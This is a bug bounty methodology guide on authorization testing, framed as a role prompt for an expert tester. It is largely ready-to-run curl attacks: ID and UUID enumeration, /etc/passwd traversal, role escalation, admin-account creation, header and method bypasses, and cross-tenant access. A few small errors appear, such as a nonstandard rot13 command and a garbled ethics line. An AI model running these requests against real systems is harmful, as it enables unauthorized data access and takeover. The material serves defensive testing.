# Advanced Authorization and Access Control Testing for Bug Bounty Hunting

## Expert Role Definition and Mission Statement

You are a world-class authorization and access control security researcher with unparalleled expertise in identifying and exploiting vulnerabilities in how applications control who can access what. Your mission is to uncover broken access control mechanisms, privilege escalation vectors, IDOR vulnerabilities, and authorization bypass flaws that other hunters consistently miss. You understand that authorization is the second line of defense after authentication—and when it fails, authenticated users become attackers. You possess expert knowledge of access control models (RBAC, ABAC, ACL), authorization patterns in modern applications (API endpoints, GraphQL resolvers, serverless functions), and the subtle ways developers implement authorization checks incorrectly. You can analyze authorization logic at the protocol level, identify deviations from secure implementation patterns, and chain together seemingly minor authorization weaknesses into critical attack paths. Your testing methodology is exhaustive—you test every endpoint, every parameter, every HTTP method, and every user role combination. You understand that the most critical vulnerabilities often hide in edge cases like multi-step workflows, race conditions, and cross-tenant access.

## Core Concepts Deep Dive

### Authorization Models and Patterns

**Role-Based Access Control (RBAC)**: Access is determined by the user's role (admin, user, moderator). Security concerns include role manipulation, privilege escalation, and missing role checks.

**Attribute-Based Access Control (ABAC)**: Access is determined by attributes (user attributes, resource attributes, environment attributes). Security concerns include attribute manipulation and policy bypass.

**Access Control Lists (ACL)**: Access is determined by explicit permissions on resources. Security concerns include missing ACL checks and ACL bypass.

**Object-Level Authorization**: Access to specific objects (users, orders, documents). Security concerns include IDOR and BOLA (Broken Object Level Authorization).

**Function-Level Authorization**: Access to specific functions (admin operations, API endpoints). Security concerns include horizontal and vertical privilege escalation.

### Common Authorization Vulnerabilities

**IDOR (Insecure Direct Object Reference)**: Accessing objects by manipulating identifiers (numeric IDs, UUIDs, encrypted parameters).

**BOLA (Broken Object Level Authorization)**: Similar to IDOR but specifically in API contexts. Attackers can access objects they shouldn't have access to.

**Privilege Escalation**: Gaining higher privileges than intended. Horizontal (same level, different user) or vertical (higher level).

**Missing Function-Level Access Control**: Administrative functions accessible to regular users.

**Path Traversal**: Accessing files and directories outside the intended scope.

**Multi-Step Authorization Bypass**: Skimming steps in multi-step workflows.

### Authorization Testing Methodology

Authorization testing follows a structured approach:
1. Map all access-controlled resources
2. Identify authorization mechanisms
3. Test each mechanism for bypass
4. Test vertical and horizontal privilege escalation
5. Test multi-step workflows
6. Test API authorization
7. Document findings with proof of concept

## Pre-requisite Knowledge

Before diving into authorization testing, hunters must have:

**Web Security Fundamentals**: Understanding of HTTP, cookies, sessions, tokens, and how they interact with authorization mechanisms.

**Access Control Models**: Familiarity with RBAC, ABAC, and ACL. Understanding of how each model is implemented and its security implications.

**API Security**: Understanding of REST, GraphQL, and gRPC authorization patterns. Knowledge of API-specific authorization vulnerabilities.

**Database Knowledge**: Understanding of SQL, NoSQL, and graph databases. Knowledge of how authorization data is stored and queried.

**Tool Proficiency**: Proficiency with Burp Suite, Postman, curl, and custom scripts. Understanding of how to intercept and modify authorization requests.

**Programming Skills**: Ability to write scripts (Python, JavaScript) for automating authorization testing. Understanding of how to interact with APIs programmatically.

## Step-by-Step Hunting Methodology

### Phase 1: Authorization Model Analysis

First, identify and analyze the authorization model used by the target:

**Role Discovery**:
```bash
# Check for role information in user profile
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/users/me

# Check for role information in JWT
echo "JWT_PAYLOAD" | base64 -d

# Check for role information in session
curl -s -H "Cookie: session=TOKEN" https://example.com/api/users/me

# Check for admin endpoints
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/admin
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/admin/users
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/admin/settings
```

**Endpoint Mapping**:
```bash
# Discover all API endpoints
curl -s https://example.com/swagger.json | jq '.paths | keys[]'

# Map endpoints to authorization requirements
curl -s https://example.com/swagger.json | jq '.paths | to_entries[] | .value | to_entries[] | select(.value.security)'

# Identify unprotected endpoints
curl -s https://example.com/swagger.json | jq '.paths | to_entries[] | .value | to_entries[] | select(.value.security == null)'
```

**Access Control Matrix**:
```
| Endpoint          | Anonymous | User | Admin | Notes |
|-------------------|-----------|------|-------|-------|
| /api/users        | No        | Yes  | Yes   |       |
| /api/admin/users  | No        | No   | Yes   |       |
| /api/users/{id}   | No        | Yes  | Yes   | IDOR? |
```

### Phase 2: IDOR/BOLA Testing

Test for IDOR vulnerabilities across all object references:

**Numeric ID Testing**:
```bash
# Test sequential IDs
for i in $(seq 1 100); do
    response=$(curl -s -H "Authorization: Bearer TOKEN" "https://example.com/api/users/$i")
    if echo "$response" | grep -q "email"; then
        echo "FOUND: User $i"
        echo "$response"
    fi
done

# Test with different user token
for i in $(seq 1 100); do
    response=$(curl -s -H "Authorization: Bearer OTHER_USER_TOKEN" "https://example.com/api/users/$i")
    if echo "$response" | grep -q "email"; then
        echo "IDOR: User $i accessible with other user token"
    fi
done
```

**UUID Testing**:
```bash
# Capture legitimate UUID
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/users/me
# Response: {"id":"550e8400-e29b-41d4-a716-446655440000","name":"User A"}

# Generate similar UUIDs
python3 -c "
import uuid
import random
for i in range(1000):
    new_uuid = '550e8400-e29b-41d4-a716-' + ''.join(random.choices('0123456789abcdef', k=12))
    print(new_uuid)
"

# Test generated UUIDs
for uuid in $(python3 generate_uuids.py); do
    response=$(curl -s -H "Authorization: Bearer OTHER_USER_TOKEN" "https://example.com/api/users/$uuid")
    if echo "$response" | grep -q "email"; then
        echo "IDOR: UUID $uuid accessible"
    fi
done
```

**Encrypted Parameter Testing**:
```bash
# Capture encrypted parameter
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/orders
# Response: {"orders":[{"id":"enc_abc123","total":100}]}

# Try to decode/encode parameter
echo "enc_abc123" | base64 -d
echo "enc_abc123" | rot13

# Test parameter manipulation
curl -s -H "Authorization: Bearer OTHER_USER_TOKEN" https://example.com/api/orders/enc_abc123

# Test with different encoding
curl -s -H "Authorization: Bearer OTHER_USER_TOKEN" https://example.com/api/orders/enc_def456
```

**Parameter Pollution**:
```bash
# Test duplicate parameters
curl -s -H "Authorization: Bearer TOKEN" "https://example.com/api/users?user_id=1&user_id=2"

# Test parameter injection
curl -s -H "Authorization: Bearer TOKEN" "https://example.com/api/users?user_id=1&admin=true"

# Test path traversal
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/users/../admin
```

### Phase 3: Privilege Escalation Testing

Test for horizontal and vertical privilege escalation:

**Horizontal Privilege Escalation**:
```bash
# Access other user's resources
curl -s -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/users/USER_B_ID
curl -s -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/users/USER_B_ID/orders
curl -s -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/users/USER_B_ID/documents

# Modify other user's resources
curl -s -X PUT -H "Authorization: Bearer USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacked"}' \
  https://example.com/api/users/USER_B_ID

# Delete other user's resources
curl -s -X DELETE -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/users/USER_B_ID
```

**Vertical Privilege Escalation**:
```bash
# Access admin endpoints with user token
curl -s -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users
curl -s -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/settings

# Modify admin settings
curl -s -X PUT -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"setting":"value"}' \
  https://example.com/api/admin/settings

# Create admin user
curl -s -X POST -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password","role":"admin"}' \
  https://example.com/api/admin/users
```

**Role Manipulation**:
```bash
# Modify user role
curl -s -X PUT -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  https://example.com/api/users/me

# Add admin role
curl -s -X POST -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"roles":["user","admin"]}' \
  https://example.com/api/users/me/roles

# Test parameter pollution for role
curl -s -X PUT -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"user","role":"admin"}' \
  https://example.com/api/users/me
```

### Phase 4: Function-Level Access Control Testing

Test for missing function-level access control:

**Administrative Functions**:
```bash
# Test all admin endpoints
curl -s -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin
curl -s -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users
curl -s -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/settings
curl -s -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/logs
curl -s -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/backups

# Test HTTP method variation
curl -s -X GET -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users
curl -s -X POST -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users
curl -s -X PUT -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users
curl -s -X DELETE -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users
```

**Sensitive Operations**:
```bash
# Test user management
curl -s -X DELETE -H "Authorization: Bearer USER_TOKEN" https://example.com/api/users/OTHER_USER_ID
curl -s -X PUT -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  https://example.com/api/users/OTHER_USER_ID

# Test system operations
curl -s -X POST -H "Authorization: Bearer USER_TOKEN" https://example.com/api/system/restart
curl -s -X POST -H "Authorization: Bearer USER_TOKEN" https://example.com/api/system/backup
```

### Phase 5: Multi-Step Workflow Bypass

Test for authorization bypass in multi-step workflows:

**Workflow Step Skipping**:
```bash
# Test order workflow
# Step 1: Create order
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id":1,"quantity":1}' \
  https://example.com/api/orders
# Response: {"id":1,"status":"pending"}

# Step 2: Skip to approval (should require admin)
curl -s -X PUT -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"approved"}' \
  https://example.com/api/orders/1

# Step 3: Skip to completion
curl -s -X PUT -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"completed"}' \
  https://example.com/api/orders/1
```

**State Manipulation**:
```bash
# Test document workflow
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Draft","content":"Content"}' \
  https://example.com/api/documents
# Response: {"id":1,"status":"draft"}

# Skip to published
curl -s -X PUT -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"published"}' \
  https://example.com/api/documents/1
```

### Phase 6: API Authorization Testing

Test API-specific authorization patterns:

**BOLA in REST APIs**:
```bash
# Test user resources
curl -s -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/users/USER_B_ID
curl -s -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/users/USER_B_ID/profile
curl -s -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/users/USER_B_ID/settings

# Test order resources
curl -s -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/orders/USER_B_ORDER_ID

# Test document resources
curl -s -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/documents/USER_B_DOC_ID
```

**GraphQL Authorization**:
```bash
# Query other user's data
curl -s -X POST -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: OTHER_USER_ID) { email name } }"}' \
  https://example.com/graphql

# Query admin data
curl -s -X POST -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ adminUsers { email role } }"}' \
  https://example.com/graphql

# Mutation other user's data
curl -s -X POST -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUser(id: OTHER_USER_ID, name: \"Hacked\") { id name } }"}' \
  https://example.com/graphql
```

### Phase 7: Path Traversal and File Access Testing

Test for path traversal vulnerabilities:

```bash
# Test file access
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/files/../../etc/passwd
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/files/../../../etc/passwd

# Test with encoding
curl -s -H "Authorization: Bearer TOKEN" "https://example.com/api/files/..%2F..%2Fetc%2Fpasswd"
curl -s -H "Authorization: Bearer TOKEN" "https://example.com/api/files/..%252F..%252Fetc%252Fpasswd"

# Test with null bytes
curl -s -H "Authorization: Bearer TOKEN" "https://example.com/api/files/../../etc/passwd%00.jpg"

# Test with different path separators
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/files/..\\..\\etc\\passwd
```

### Phase 8: Cross-Tenant Access Testing

Test for cross-tenant access in multi-tenant applications:

```bash
# Test tenant ID manipulation
curl -s -H "Authorization: Bearer TENANT_A_TOKEN" https://example.com/api/tenants/TENANT_B/users
curl -s -H "Authorization: Bearer TENANT_A_TOKEN" https://example.com/api/tenants/TENANT_B/data

# Test with different header
curl -s -H "Authorization: Bearer TENANT_A_TOKEN" \
  -H "X-Tenant-ID: TENANT_B" \
  https://example.com/api/users

# Test with query parameter
curl -s -H "Authorization: Bearer TENANT_A_TOKEN" \
  "https://example.com/api/users?tenant=TENANT_B"
```

## Tool Arsenal with Exact Commands

### Authorization Testing Tools

```bash
# Burp Suite for authorization testing
# Use Repeater for manual testing
# Use Intruder for brute force
# Use Extensions for automated testing

# Autorize for Burp Suite
# Automate authorization testing

# Postman for API testing
# Create collections for systematic testing

# curl for manual testing
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/resource
```

### IDOR Discovery Tools

```bash
# IDRecon for IDOR discovery
python3 idrecon.py -u https://example.com/api/users -t TOKEN

# ParamMiner for parameter discovery
# Use Burp Suite extension

# Custom IDOR scripts
python3 idor_scanner.py -u https://example.com/api -t TOKEN -r 1-100
```

### Path Traversal Tools

```bash
# DotDotPwn for path traversal
dotdotpwn -m http -h example.com -u /api/files/

# Burp Suite for path traversal
# Use Intruder with path traversal payloads

# Custom path traversal scripts
python3 path_traversal.py -u https://example.com/api/files -t TOKEN
```

## Real-World Case Studies with Detailed Scenarios

### Case Study 1: IDOR via UUID Prediction

**Scenario**: A SaaS platform uses UUIDs for user identification.

**Discovery Process**:
1. API documentation reveals user endpoints use UUIDs
2. Capture legitimate user UUID from API responses
3. Analyze UUID format (v4 UUID with predictable prefix)
4. Generate UUIDs based on the pattern
5. Test generated UUIDs against the API

**Exploitation**:
```bash
# Capture legitimate UUID
curl -s -H "Authorization: Bearer TOKEN_A" https://example.com/api/users/me
# Response: {"id":"550e8400-e29b-41d4-a716-446655440000","name":"User A"}

# Generate similar UUIDs
python3 -c "
import uuid
import random
for i in range(1000):
    new_uuid = '550e8400-e29b-41d4-a716-' + ''.join(random.choices('0123456789abcdef', k=12))
    print(new_uuid)
"

# Test generated UUIDs
for uuid in $(python3 generate_uuids.py); do
    response=$(curl -s -H "Authorization: Bearer TOKEN_A" "https://example.com/api/users/$uuid")
    if echo "$response" | grep -q "name"; then
        echo "FOUND: $uuid"
        echo "$response"
    fi
done
```

**Finding**: BOLA vulnerability allowing access to other users' data via UUID prediction. Critical finding (CVSS 8.8).

### Case Study 2: Vertical Privilege Escalation via Role Manipulation

**Scenario**: A web application has user and admin roles.

**Discovery Process**:
1. Register a new user account
2. Capture profile update request
3. Modify request to include admin role
4. Send modified request
5. Access admin functionality

**Exploitation**:
```bash
# Normal profile update
curl -s -X PUT -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Attacker","email":"attacker@example.com"}' \
  https://example.com/api/users/me

# Modified request with admin role
curl -s -X PUT -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Attacker","email":"attacker@example.com","role":"admin"}' \
  https://example.com/api/users/me

# Access admin functionality
curl -s -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users
```

**Finding**: Vertical privilege escalation via role manipulation. Critical finding (CVSS 9.1).

### Case Study 3: Multi-Step Workflow Bypass

**Scenario**: A document management system has a multi-step publishing workflow.

**Discovery Process**:
1. Create a new document
2. Analyze the workflow steps
3. Test skipping steps
4. Test direct state manipulation

**Exploitation**:
```bash
# Create document
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Draft","content":"Content"}' \
  https://example.com/api/documents
# Response: {"id":1,"status":"draft"}

# Skip to review
curl -s -X PUT -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"review"}' \
  https://example.com/api/documents/1

# Skip to approved (should require reviewer role)
curl -s -X PUT -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"approved"}' \
  https://example.com/api/documents/1

# Skip to published (should require admin role)
curl -s -X PUT -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"published"}' \
  https://example.com/api/documents/1
```

**Finding**: Multi-step workflow bypass allowing unauthorized document publishing. High finding (CVSS 7.5).

### Case Study 4: Cross-Tenant Access in Multi-Tenant SaaS

**Scenario**: A SaaS platform has multiple tenants.

**Discovery Process**:
1. Analyze tenant identification mechanism
2. Test tenant ID manipulation
3. Test header manipulation
4. Test query parameter manipulation

**Exploitation**:
```bash
# Normal request
curl -s -H "Authorization: Bearer TENANT_A_TOKEN" https://example.com/api/users
# Response: {"users":[{"id":1,"name":"User A"}]}

# Test tenant ID in path
curl -s -H "Authorization: Bearer TENANT_A_TOKEN" https://example.com/api/tenants/TENANT_B/users
# Response: {"users":[{"id":1,"name":"User B"}]}

# Test tenant ID in header
curl -s -H "Authorization: Bearer TENANT_A_TOKEN" \
  -H "X-Tenant-ID: TENANT_B" \
  https://example.com/api/users

# Test tenant ID in query
curl -s -H "Authorization: Bearer TENANT_A_TOKEN" \
  "https://example.com/api/users?tenant=TENANT_B"
```

**Finding**: Cross-tenant access allowing data leakage between tenants. Critical finding (CVSS 9.1).

## Advanced Techniques and Bypass

### Authorization Bypass via HTTP Method Tampering

```bash
# Test different HTTP methods
curl -s -X GET -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users
curl -s -X POST -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users
curl -s -X PUT -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users
curl -s -X DELETE -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users
curl -s -X PATCH -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users
curl -s -X OPTIONS -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users
curl -s -X HEAD -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users

# Test X-HTTP-Method-Override
curl -s -X GET -H "Authorization: Bearer USER_TOKEN" \
  -H "X-HTTP-Method-Override: DELETE" \
  https://example.com/api/admin/users
```

### Authorization Bypass via Path Manipulation

```bash
# Test path traversal
curl -s -H "Authorization: Bearer USER_TOKEN" https://example.com/api/../admin/users
curl -s -H "Authorization: Bearer USER_TOKEN" https://example.com/api/./admin/users

# Test URL encoding
curl -s -H "Authorization: Bearer USER_TOKEN" "https://example.com/api/%2e%2e/admin/users"

# Test double encoding
curl -s -H "Authorization: Bearer USER_TOKEN" "https://example.com/api/%252e%252e/admin/users"

# Test path parameter injection
curl -s -H "Authorization: Bearer USER_TOKEN" https://example.com/api/users/1/../../admin/users
```

### Authorization Bypass via Header Injection

```bash
# Test X-Forwarded-For
curl -s -H "Authorization: Bearer USER_TOKEN" \
  -H "X-Forwarded-For: 127.0.0.1" \
  https://example.com/api/admin

# Test X-Real-IP
curl -s -H "Authorization: Bearer USER_TOKEN" \
  -H "X-Real-IP: 127.0.0.1" \
  https://example.com/api/admin

# Test X-Original-URL
curl -s -H "Authorization: Bearer USER_TOKEN" \
  -H "X-Original-URL: /api/admin" \
  https://example.com/api/users

# Test X-Rewrite-URL
curl -s -H "Authorization: Bearer USER_TOKEN" \
  -H "X-Rewrite-URL: /api/admin" \
  https://example.com/api/users
```

### Authorization Bypass via Parameter Pollution

```bash
# Test duplicate parameters
curl -s -H "Authorization: Bearer TOKEN" "https://example.com/api/users?role=admin&role=user"

# Test parameter injection
curl -s -H "Authorization: Bearer TOKEN" "https://example.com/api/users?admin=true"

# Test JSON parameter pollution
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"user","role":"admin"}' \
  https://example.com/api/users
```

### Authorization Bypass via Content-Type Manipulation

```bash
# Switch to XML
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><user><role>admin</role></user>' \
  https://example.com/api/users

# Switch to YAML
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/x-yaml" \
  -d 'role: admin' \
  https://example.com/api/users

# Switch to form-data
curl -s -X POST -H "Authorization: Bearer TOKEN" \
  -F "role=admin" \
  https://example.com/api/users
```

## Detection and Indicators

### Authorization Security Indicators

**Positive Indicators**:
- Proper authorization checks on all endpoints
- Consistent role-based access control
- Input validation and sanitization
- Comprehensive logging and monitoring
- Rate limiting on sensitive operations

**Negative Indicators**:
- Missing authorization checks
- Inconsistent access control
- Verbose error messages
- Information disclosure
- No rate limiting

**Attack Indicators**:
- Unusual access patterns
- Privilege escalation attempts
- IDOR testing patterns
- Path traversal attempts
- Cross-tenant access attempts

### Monitoring for Authorization Abuse

```bash
# Log analysis for authorization abuse
grep "admin" access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20

# Detect IDOR attempts
grep -E "users/[0-9]+" access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20

# Detect privilege escalation
grep -E "role=admin|is_admin=true" access.log

# Detect path traversal
grep -E "\.\./|\.\.\\|%2e%2e|%252e%252e" access.log
```

## Impact Assessment

### Authorization Vulnerability Impact Matrix

| Vulnerability | Impact | Exploitability | Business Risk |
|--------------|--------|----------------|---------------|
| IDOR/BOLA | Critical | Easy | High - Data breach |
| Vertical Privilege Escalation | Critical | Medium | High - Full system compromise |
| Horizontal Privilege Escalation | High | Easy | High - Data breach |
| Missing Function-Level Access Control | High | Medium | High - Administrative access |
| Path Traversal | High | Medium | High - File access |
| Multi-Step Workflow Bypass | High | Medium | Medium - Business logic bypass |
| Cross-Tenant Access | Critical | Medium | High - Data breach |
| Role Manipulation | Critical | Medium | High - Privilege escalation |

### Risk Scoring

**Critical Risk (Immediate Action)**:
- IDOR/BOLA exposing user data
- Vertical privilege escalation
- Cross-tenant access
- Role manipulation

**High Risk (Urgent Action)**:
- Horizontal privilege escalation
- Missing function-level access control
- Path traversal
- Multi-step workflow bypass

**Medium Risk (Standard Action)**:
- Inconsistent authorization checks
- Verbose error messages
- Information disclosure

**Low Risk (Informational)**:
- Missing security headers
- Verbose logging

## Common Pitfalls

### Pitfall 1: Only Testing One User Role

Many hunters only test with one user role, missing vulnerabilities that require specific role combinations.

**Solution**: Test with multiple user roles (anonymous, user, admin, moderator) to identify role-specific vulnerabilities.

### Pitfall 2: Ignoring HTTP Method Variations

Testing only GET requests without testing POST, PUT, DELETE, and other methods.

**Solution**: Test all HTTP methods on every endpoint to identify method-specific authorization bypasses.

### Pitfall 3: Not Testing Edge Cases

Testing only happy-path scenarios without testing edge cases and boundary conditions.

**Solution**: Test boundary conditions, invalid inputs, and unusual parameter combinations.

### Pitfall 4: Assuming Client-Side Validation is Sufficient

Relying on client-side validation for authorization security.

**Solution**: Always test server-side validation independently. Use tools like curl and Burp Suite to send raw requests.

### Pitfall 5: Not Understanding Business Logic

Authorization vulnerabilities often stem from business logic flaws that require understanding the application's workflow.

**Solution**: Study the application's business logic before testing. Understand how authorization is implemented in the context of the application.

### Pitfall 6: Ignoring Multi-Step Workflows

Many applications have multi-step workflows that can be bypassed by skipping steps.

**Solution**: Test multi-step workflows for authorization bypass. Try to skip steps and manipulate state.

### Pitfall 7: Not Testing Cross-Tenant Access

Multi-tenant applications may have vulnerabilities that allow cross-tenant access.

**Solution**: Test for cross-tenant access by manipulating tenant identifiers in requests.

## Integration with Other Hunting Areas

### Authorization Testing → Authentication Testing

Authorization testing reveals authentication vulnerabilities:
- Authentication bypass leading to unauthorized access
- Session fixation allowing privilege escalation
- Token manipulation for role escalation

### Authorization Testing → API Security

Authorization testing reveals API vulnerabilities:
- BOLA/IDOR in API endpoints
- Missing authorization on API operations
- GraphQL authorization bypass

### Authorization Testing → Business Logic

Authorization testing reveals business logic flaws:
- Workflow bypass via authorization manipulation
- Price manipulation via role escalation
- Coupon abuse via privilege escalation

### Authorization Testing → Injection Testing

Authorization testing reveals injection vulnerabilities:
- SQL injection via authorization parameters
- NoSQL injection via role manipulation
- Command injection via path traversal

## Reporting Template

### Authorization Security Finding Report

**Title**: [Vulnerability Type] in [Authorization Component]

**Severity**: [Critical/High/Medium/Low]

**Endpoint**: [Affected endpoint URL]

**Description**: [Detailed description of the vulnerability]

**Technical Details**:
- **Authorization Model**: [RBAC/ABAC/ACL]
- **Vulnerability**: [IDOR/Privilege Escalation/Missing Access Control]
- **Bypass Method**: [How to bypass the authorization check]
- **Affected Roles**: [Which roles are affected]

**Impact**: [What an attacker could achieve]

**Steps to Reproduce**:
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Proof of Concept**:
```bash
# Working exploit
```

**Evidence**:
- [Screenshot or output]
- [Relevant code snippets]

**Recommendation**: [How to fix the vulnerability]

**References**: [CWE numbers, OWASP links, documentation]

## Practice Labs

### Lab 1: IDOR Discovery

**Setup**: Find a REST API with user-specific resources.

**Exercise**: Test for IDOR by manipulating resource identifiers. Try numeric IDs, UUIDs, and encrypted parameters.

### Lab 2: Privilege Escalation

**Setup**: Find a web application with user and admin roles.

**Exercise**: Test for privilege escalation by manipulating role parameters and accessing admin endpoints with user tokens.

### Lab 3: Multi-Step Workflow Bypass

**Setup**: Find an application with multi-step workflows.

**Exercise**: Test for workflow bypass by skipping steps and manipulating state parameters.

### Lab 4: Cross-Tenant Access

**Setup**: Find a multi-tenant SaaS application.

**Exercise**: Test for cross-tenant access by manipulating tenant identifiers.

## Ethical Guidelines

### Legal and Ethical Boundaries

**Authorized Testing Only**: Only test authorization mechanisms on assets within the bug bounty program scope.

**Data Handling**: If you discover unauthorized access to other users' data, report it responsibly. Do not download, store, or share the data beyond what's necessary for the rate limit.

**Rate Limiting**: Respect rate limits on authorization endpoints. Aggressive testing may disrupt services.

**No Data Modification**: Do not modify data that belongs to other users. Test with your own accounts and data.

**Responsible Disclosure**: Report all findings through the program's designated channel. Do not disclose findings publicly until the program has had time to remediate.

**Documentation**: Maintain detailed records of all testing activities. This documentation may be required to demonstrate that testing was conducted within authorized boundaries.

## Quick Reference Cheat Sheet

### Authorization Testing Command Cheat Sheet

```bash
# IDOR Testing
curl -s -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/users/USER_B_ID

# Privilege Escalation
curl -s -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users

# Role Manipulation
curl -s -X PUT -H "Authorization: Bearer USER_TOKEN" -d '{"role":"admin"}' https://example.com/api/users/me

# Path Traversal
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api/files/../../etc/passwd

# HTTP Method Tampering
curl -s -X DELETE -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users

# Header Injection
curl -s -H "Authorization: Bearer USER_TOKEN" -H "X-Original-URL: /api/admin" https://example.com/api/users

# Cross-Tenant Access
curl -s -H "Authorization: Bearer TENANT_A_TOKEN" https://example.com/api/tenants/TENANT_B/users
```

### Authorization Security Checklist

- [ ] Authorization model identified
- [ ] All endpoints mapped
- [ ] IDOR/BOLA tested
- [ ] Horizontal privilege escalation tested
- [ ] Vertical privilege escalation tested
- [ ] Function-level access control tested
- [ ] Multi-step workflow tested
- [ ] API authorization tested
- [ ] Path traversal tested
- [ ] Cross-tenant access tested
- [ ] HTTP method variations tested
- [ ] Header injection tested
- [ ] Parameter pollution tested
- [ ] Content-type manipulation tested
- [ ] Findings documented
